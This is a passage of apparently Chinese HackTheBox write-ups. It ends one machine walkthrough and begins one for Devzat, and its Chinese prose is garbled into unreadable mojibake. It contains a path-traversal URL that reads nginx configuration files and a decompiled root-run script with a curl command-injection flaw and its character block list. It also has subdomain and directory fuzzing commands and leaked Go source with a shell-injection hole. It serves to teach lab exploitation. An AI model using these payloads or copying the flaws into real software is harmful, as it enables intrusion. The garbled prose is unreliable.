<p><img src="https://img-blog.csdnimg.cn/37a1d401639748fa8d5f7d6a6d032e60.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬è¿›è¡Œä¿¡æ¯æ”¶é›†æ—¶å‘ç°ï¼Œç›®æ ‡ä¸»æœºä¸Šè¿è¡Œç€nginxæœåŠ¡å™¨ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•è¯»å–nginxç›¸å…³çš„ç”¨æˆ·é…ç½®ä¿¡æ¯ã€‚è¯»å–åˆ°çš„è·¯å¾„æ˜¯<code>/home/code/coder</code>ï¼Œå¹¶ä¸”å­˜åœ¨å¯†ç ä¿¡æ¯æ–‡ä»¶<code>db.yaml</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.10.11.126/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/d0b8d96c2fff4e1591dcb2463dd98829.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆåŠŸè¯»å–åˆ°codeç”¨æˆ·ä¿¡æ¯å’Œç›¸å…³å¯†ç ä¿¡æ¯å†…å®¹<br><img src="https://img-blog.csdnimg.cn/c7333db6968b416cacbab568dcebd320.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä»æ”¶é›†çš„ä¿¡æ¯ä¸Šçœ‹ï¼Œcodeç”¨æˆ·æ˜¯å¯ä»¥ä½¿ç”¨sshè¿æ¥bashç»ˆç«¯çš„<br><img src="https://img-blog.csdnimg.cn/5909c1cd13dc4df6a51189f4a7ea807f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/02f18e5957bc45f5911b267d955b6828.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒåˆ°ROOT"><a href="#ææƒåˆ°ROOT" class="headerlink" title="ææƒåˆ°ROOT"></a>ææƒåˆ°ROOT</h2><p>å‘ç°å¯ä»¥ä»¥rootèº«ä»½è¿è¡Œtreportç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•è¿è¡Œåˆ†æå…¶åŠŸèƒ½<br><img src="https://img-blog.csdnimg.cn/0ccb282c259d4e9ea27ec430d04b4b95.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°æ˜¯å¯¹åˆ†ææŠ¥å‘Šçš„ç”Ÿæˆï¼Œå¹¶ä¸”æ–‡ä»¶çš„ç±»å‹æ˜¯pythonï¼Œåœ¨ç¬¬ä¸‰ä¸ªé€‰æ‹©ä¸Šè°ƒç”¨äº†curlå‘½ä»¤è¿›è¡ŒæŠ¥å‘Šä¸‹è½½<br><img src="https://img-blog.csdnimg.cn/f6e677204f80458db27023145b872e38.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çªç ´ç‚¹å°±æ˜¯åœ¨ç¬¬ä¸‰ä¸ªé€‰é¡¹ä¸Šï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“ä»–å…·ä½“ç¨‹åºçš„æºç æ˜¯æ€ä¹ˆå®ç°çš„ï¼Œæ‰€ä»¥éœ€è¦å¯¹è¿™ä¸ªpythonæ–‡ä»¶è¿›è¡Œé€†å‘æºç è¿˜åŸã€‚è¿™é‡Œä½¿ç”¨åˆ°çš„å·¥å…·æœ‰<code>pyinstxtractor</code>å’Œ<code>pycdc</code>ï¼Œå¹¶ä¸”å°†treportæ–‡ä»¶é€šè¿‡scpçš„å½¢å¼ä¸‹è½½ä¸‹æ¥<br><img src="https://img-blog.csdnimg.cn/f414b554fcc14d4c9351cf7763f734ba.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è„šæœ¬è¿è¡ŒæˆåŠŸåä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„æ–‡ä»¶å¤¹<br><img src="https://img-blog.csdnimg.cn/9ed3cfb08b8e4fd092e3fcbc27ebfe60.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ–‡ä»¶å¤¹å†…å¤§éƒ¨åˆ†æ–‡ä»¶éƒ½æ˜¯pycæ–‡ä»¶æ ¼å¼<br><img src="https://img-blog.csdnimg.cn/121f6a8d3c3849f7af0cee4353e1848e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆæˆ‘ä»¬å°±è¦ç”¨åˆ°cå’Œc++çš„è½¬æ¢å·¥å…·äº†<br><img src="https://img-blog.csdnimg.cn/e895ce0488c147ffb5fd266f9be93cc5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/a41b4ae29bb949d99332f17c8c92b5b7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é€šè¿‡å®¡è®¡æºä»£ç å¯ä»¥å¾—çŸ¥ï¼Œåœ¨ä¸‹è½½æ–‡ä»¶éƒ¨åˆ†ä½¿ç”¨äº†é»‘åå•è¿›è¡Œè¿‡æ»¤ï¼Œä½†æ˜¯å”¯ç‹¬æ²¡æœ‰è¿‡æ»¤å¤§æ‹¬å·ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤§æ‹¬å·è¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨curlçš„â€“configå‚æ•°å¯¹æŒ‡å®šæ–‡ä»¶å†…å®¹è¿›è¡Œè¯»å–</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./pycdc ../treport_extracted/treport.pyc</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: treport.pyc (Python 3.9)</span></span><br><span class="line"></span><br><span class="line">Unsupported opcode: &lt;<span class="number">255</span>&gt;</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">threat_report</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">self</span>):</span></span><br><span class="line">Unsupported opcode: &lt;<span class="number">255</span>&gt;</span><br><span class="line">        file_name = <span class="built_in">input</span>(<span class="string">&#x27;Enter the filename:&#x27;</span>)</span><br><span class="line">        content = <span class="built_in">input</span>(<span class="string">&#x27;Enter the report:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;../&#x27;</span> <span class="keyword">in</span> file_name:</span><br><span class="line">            print(<span class="string">&#x27;NOT ALLOWED&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        file_path = <span class="string">&#x27;/root/reports/&#x27;</span> + file_name</span><br><span class="line">    <span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">list_files</span>(<span class="params">self</span>):</span></span><br><span class="line">        file_list = os.listdir(<span class="string">&#x27;/root/reports/&#x27;</span>)</span><br><span class="line">        files_in_dir = <span class="string">&#x27; &#x27;</span>.join((<span class="keyword">lambda</span> <span class="number">.0</span>: [ <span class="built_in">str</span>(elem) <span class="keyword">for</span> elem <span class="keyword">in</span> <span class="number">.0</span> ])(file_list))</span><br><span class="line">        print(<span class="string">&#x27;ALL THE THREAT REPORTS:&#x27;</span>)</span><br><span class="line">        print(files_in_dir)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">self</span>):</span></span><br><span class="line">Unsupported opcode: &lt;<span class="number">255</span>&gt;</span><br><span class="line">        file_name = <span class="built_in">input</span>(<span class="string">&#x27;\nEnter the filename:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;../&#x27;</span> <span class="keyword">in</span> file_name:</span><br><span class="line">            print(<span class="string">&#x27;NOT ALLOWED&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        contents = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        file_name = <span class="string">&#x27;/root/reports/&#x27;</span> + file_name</span><br><span class="line">    <span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">download</span>(<span class="params">self</span>):</span></span><br><span class="line">        now = datetime.now()</span><br><span class="line">        current_time = now.strftime(<span class="string">&#x27;%H_%M_%S&#x27;</span>)</span><br><span class="line">        command_injection_list = [</span><br><span class="line">            <span class="string">&#x27;$&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;`&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;&amp;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;|&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;||&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;&gt;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;&lt;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;?&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;@&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;$&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;^&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;(&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;)&#x27;</span>]</span><br><span class="line">        ip = <span class="built_in">input</span>(<span class="string">&#x27;Enter the IP/file_name:&#x27;</span>)</span><br><span class="line">        res = <span class="built_in">bool</span>(re.search(<span class="string">&#x27;\\s&#x27;</span>, ip))</span><br><span class="line">        <span class="keyword">if</span> res:</span><br><span class="line">            print(<span class="string">&#x27;INVALID IP&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">in</span> ip <span class="keyword">and</span> <span class="string">&#x27;gopher&#x27;</span> <span class="keyword">in</span> ip <span class="keyword">or</span> <span class="string">&#x27;mysql&#x27;</span> <span class="keyword">in</span> ip:</span><br><span class="line">            print(<span class="string">&#x27;INVALID URL&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        cmd = <span class="string">&#x27;/bin/bash -c &quot;curl &#x27;</span> + ip + <span class="string">&#x27; -o /root/reports/threat_report_&#x27;</span> + current_time + <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">        os.system(cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/e74f33ca978844968ee75dd4938f38b9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>æœ¬åœ°æ–‡ä»¶è¯»å–</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Devzat</title>
    <url>/2022/01/31/Devzat/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>ç›®æ ‡ä¸»æœºå¼€æ”¾äº†webæœåŠ¡ã€sshæœåŠ¡å’Œå¦å¤–ä¸€ä¸ªåœ¨8000ç«¯å£å¼€æ”¾çš„sshæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/21b6d282e8da4c69b98366ce01e46824.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°è¯•è¿æ¥8000ç«¯å£çš„sshæœåŠ¡ï¼Œå‘ç°æ˜¯ä¸€ä¸ªèŠå¤©çª—å£<br><img src="https://img-blog.csdnimg.cn/84313fe1057f44c28891d502ea10fcc5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p>æŸ¥çœ‹å®Œå¯æ‰§è¡Œçš„å‘½ä»¤åï¼Œè¿˜æ˜¯æ²¡æœ‰æ–°çš„å‘ç°<br><img src="https://img-blog.csdnimg.cn/c177659919d14648a3242a3318b51298.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>è®¿é—®webæœåŠ¡æ—¶ï¼Œå‘ç°åªæ˜¯ä¸€ä¸ªæ™®é€šçš„æ¨é”€ç½‘ç«™è€Œå·²ï¼Œå¹¶ä¸”æ‰«æç›®å½•æ–‡ä»¶æ—¶ä¹Ÿæ²¡æœ‰å‘ç°æœ‰ä»·å€¼çš„ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/09ad4566419a4b90b458ab4f5f54788e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://devzat.htb/&quot;</span> -e * -x404,403,500 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/0551196c84a14524bac03c2c69952c82.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>æ—¢ç„¶æ²¡æœ‰æœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—åˆ‡æ¢æ€è·¯äº†ï¼Œæˆ‘ä»¬å¾—å°è¯•æ‰«ææ˜¯å¦å­˜åœ¨å­åŸŸåï¼Œå­˜åœ¨ä¸€ä¸ªpetså­åŸŸ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -u <span class="string">&quot;http://devzat.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 26 -H <span class="string">&quot;HOST:FUZZ.devzat.htb&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/a70274adbfa948bcab7740d140f6fe6e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è®¿é—®å­åŸŸç½‘ç«™çš„é¡µé¢ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ·»åŠ å® ç‰©å§“åçš„ä¸€ä¸ªåŠŸèƒ½ç«™ç‚¹<br><img src="https://img-blog.csdnimg.cn/73950ecdc3994db6b934d94aa67e3f72.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å¯¹è¿™ä¸ªurlè·¯å¾„è¿›è¡Œç›®å½•æ‰«æï¼Œå‘ç°äº†ä¸€ä¸ªgitæºç æ³„éœ²</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://pets.devzat.htb&quot;</span> -e * -x404,403,500 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/70fc1cc7625040a2bcde7d064b309483.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è®¿é—®ç›®å½•æ—¶ï¼Œæˆ‘ä»¬å‘ç°å­˜åœ¨ä»¥ä¸‹ç›®å½•ã€‚æˆ‘ä»¬ä½¿ç”¨GitToolså·¥å…·è¿˜åŸæºç æ•°æ®<br><img src="https://img-blog.csdnimg.cn/cb028e4f2ddc4b189d580d34c06a58cb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/a5825b6e5ff54569803bb1b78576105d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/e0022a2d30b943f0b4f8baaef52c3697.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿˜åŸå‡ºæºç ä¹‹åï¼Œæˆ‘ä»¬çœ‹åˆ°å­˜åœ¨ä¸€ä¸ªmain.goæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥æ‰“å¼€main.goæ–‡ä»¶å®¡è®¡æºç çœ‹çœ‹æ˜¯å¦å­˜åœ¨æ¼æ´<br><img src="https://img-blog.csdnimg.cn/c8a248995b4147deb28e8f0b50c74a47.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æˆ‘ä»¬çœ‹åˆ°ä»£ç <code>cmd := exec.Command(&quot;sh&quot;, &quot;-c&quot;, &quot;cat characteristics/&quot;+species)</code>å¤„å­˜åœ¨ä¸€ä¸ªå‘½ä»¤æ³¨å…¥ï¼Œè€Œä¸”åŠŸèƒ½å¤„æ˜¯æ·»åŠ speciesç§ç±»å¤„ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ç‚¹æ‰§è¡Œæ¶æ„çš„ä»£ç ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;embed&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/fs&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed static/public</span></span><br><span class="line"><span class="keyword">var</span> web embed.FS</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed static/public/index.html</span></span><br><span class="line"><span class="keyword">var</span> index []<span class="keyword">byte</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Pet <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name            <span class="keyword">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">	Species         <span class="keyword">string</span> <span class="string">`json:&quot;species&quot;`</span></span><br><span class="line">	Characteristics <span class="keyword">string</span> <span class="string">`json:&quot;characteristics&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	Pets []Pet = []Pet&#123;</span><br><span class="line">		&#123;Name: <span class="string">&quot;Cookie&quot;</span>, Species: <span class="string">&quot;cat&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;cat&quot;</span>)&#125;,</span><br><span class="line">		&#123;Name: <span class="string">&quot;Mia&quot;</span>, Species: <span class="string">&quot;cat&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;cat&quot;</span>)&#125;,</span><br><span class="line">		&#123;Name: <span class="string">&quot;Chuck&quot;</span>, Species: <span class="string">&quot;dog&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;dog&quot;</span>)&#125;,</span><br><span class="line">		&#123;Name: <span class="string">&quot;Balu&quot;</span>, Species: <span class="string">&quot;dog&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;dog&quot;</span>)&#125;,</span><br><span class="line">		&#123;Name: <span class="string">&quot;Georg&quot;</span>, Species: <span class="string">&quot;gopher&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;gopher&quot;</span>)&#125;,</span><br><span class="line">		&#123;Name: <span class="string">&quot;Gustav&quot;</span>, Species: <span class="string">&quot;giraffe&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;giraffe&quot;</span>)&#125;,</span><br><span class="line">		&#123;Name: <span class="string">&quot;Rudi&quot;</span>, Species: <span class="string">&quot;redkite&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;redkite&quot;</span>)&#125;,</span><br><span class="line">		&#123;Name: <span class="string">&quot;Bruno&quot;</span>, Species: <span class="string">&quot;bluewhale&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;bluewhale&quot;</span>)&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loadCharacter</span><span class="params">(species <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	cmd := exec.Command(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;cat characteristics/&quot;</span>+species)</span><br><span class="line">	stdoutStderr, err := cmd.CombinedOutput()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err.Error()</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">string</span>(stdoutStderr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getPets</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	json.NewEncoder(w).Encode(Pets)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">addPet</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	reqBody, _ := ioutil.ReadAll(r.Body)</span><br><span class="line">	<span class="keyword">var</span> addPet Pet</span><br><span class="line">	err := json.Unmarshal(reqBody, &amp;addPet)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		e := fmt.Sprintf(<span class="string">&quot;There has been an error: %+v&quot;</span>, err)</span><br><span class="line">		http.Error(w, e, http.StatusBadRequest)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	addPet.Characteristics = loadCharacter(addPet.Species)</span><br><span class="line">	Pets = <span class="built_in">append</span>(Pets, addPet)</span><br><span class="line"></span><br><span class="line">	w.WriteHeader(http.StatusOK)</span><br><span class="line">	fmt.Fprint(w, <span class="string">&quot;Pet was added successfully&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleRequest</span><span class="params">()</span></span> &#123;</span><br><span class="line">	build, err := fs.Sub(web, <span class="string">&quot;static/public/build&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	css, err := fs.Sub(web, <span class="string">&quot;static/public/css&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	webfonts, err := fs.Sub(web, <span class="string">&quot;static/public/webfonts&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	spaHandler := http.HandlerFunc(spaHandlerFunc)</span><br><span class="line">	<span class="comment">// Single page application handler</span></span><br><span class="line">	http.Handle(<span class="string">&quot;/&quot;</span>, headerMiddleware(spaHandler))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// All static folder handler</span></span><br><span class="line">	http.Handle(<span class="string">&quot;/build/&quot;</span>, headerMiddleware(http.StripPrefix(<span class="string">&quot;/build&quot;</span>, http.FileServer(http.FS(build)))))</span><br><span class="line">	http.Handle(<span class="string">&quot;/css/&quot;</span>, headerMiddleware(http.StripPrefix(<span class="string">&quot;/css&quot;</span>, http.FileServer(http.FS(css)))))</span><br><span class="line">	http.Handle(<span class="string">&quot;/webfonts/&quot;</span>, headerMiddleware(http.StripPrefix(<span class="string">&quot;/webfonts&quot;</span>, http.FileServer(http.FS(webfonts)))))</span><br><span class="line">	http.Handle(<span class="string">&quot;/.git/&quot;</span>, headerMiddleware(http.StripPrefix(<span class="string">&quot;/.git&quot;</span>, http.FileServer(http.Dir(<span class="string">&quot;.git&quot;</span>)))))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// API routes</span></span><br><span 